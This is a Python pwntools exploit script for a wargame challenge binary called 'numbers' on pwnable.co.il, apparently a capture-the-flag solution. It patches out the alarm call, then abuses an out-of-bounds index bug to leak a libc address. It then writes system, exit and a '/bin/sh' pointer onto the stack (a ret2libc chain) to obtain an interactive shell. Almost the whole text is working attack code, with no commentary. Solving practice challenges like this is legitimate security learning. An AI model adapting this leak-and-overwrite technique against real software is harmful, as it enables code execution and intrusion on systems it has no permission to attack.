  from pwn import * 

context.log_level = 'DEBUG'
context.binary = elf = ELF('./numbers')

#Nulify alarm function
elf.asm(elf.symbols['alarm'], 'ret')
elf.save('./patched_numbers')

context.binary = elf = ELF('./patched_numbers')

if args['REMOTE']:
    io = remote('pwnable.co.il', 9005)
else: 
    io = process([elf.path])
    

def decrease_index(): 
    global io
    
    io.recvuntil(b'> ')   
    io.sendline(b'2')

def increase(): 
    global io
    
    io.recvuntil(b'> ')   
    io.sendline(b'1')

def set_index(index): 
    global io

    io.recvuntil(b'> ')
    io.sendline(b'3')
    io.recvuntil(b'New index: ')
    io.sendline(str(index))

def write_number(value):
    global io

    io.recvuntil(b'> ')
    io.sendline(b'4')
    io.recvuntil(b'Enter unsigned number: ')
    io.sendline(str(value))
   
def exit():
    global io    
    
    io.recvuntil(b'> ')   
    io.sendline(b'6')

def read_number(): 
    global io
    
    io.recvuntil(b'> ')   
    io.sendline(b'5')
    io.recvuntil(b'Number at index: ')
    number = int(io.recv(10).decode())
    
    return number 


set_index(39)
increase()    

return_offset = 49 
format_string = 0x00752500
write_number(format_string + return_offset)
return_address = read_number()
print(return_address)

libc_base_address = return_address - 110309
bin_sh = libc_base_address + 0x18e363
system = libc_base_address + 0x41790
exit_f = libc_base_address + 0x340d0

for _ in range(9):
    decrease_index()
write_number(format_string + return_offset + 2)
write_number(bin_sh)
decrease_index()
write_number(exit_f)
decrease_index()
write_number(system)
exit()

io.interactive()
